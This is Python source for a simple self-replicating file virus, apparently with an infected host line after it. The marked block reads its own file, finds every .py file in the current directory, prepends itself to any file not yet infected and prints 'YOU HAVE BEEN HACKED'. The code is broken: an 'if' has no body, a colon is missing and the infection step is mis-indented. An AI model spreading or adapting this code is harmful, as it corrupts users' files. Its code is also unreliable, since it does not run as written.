##START OF VIRUS##
import sys,glob
code=[]
with open(sys.argv[0],"r") as f:
    lines=f.readlines()
virus_area=False
for line in lines:
    if line == "##START OF VIRUS##\n":
        virus_area=True
    if virus_area:
        code.append(line)
    if line == "##END OF VIRUS##\n":
python_files=glob.glob("*.py")
print("files are",python_files)
for file in python_files:
    with open(file,"r") as f:
        script_code=f.readlines()
    infected=False
    for line in script_code:
        if line == "##START OF VIRUS##\n"
            infected=True
            break
        if not infected:
            final_code=[]
            final_code.extend(code)
            final_code.extend("\n")
            final_code.extend(script_code)
            with open(file,"w") as f:
                f.writelines(final_code)
print("YOU HAVE BEEN HACKED")
##END OF VIRUS##
print("HELLO WORLD")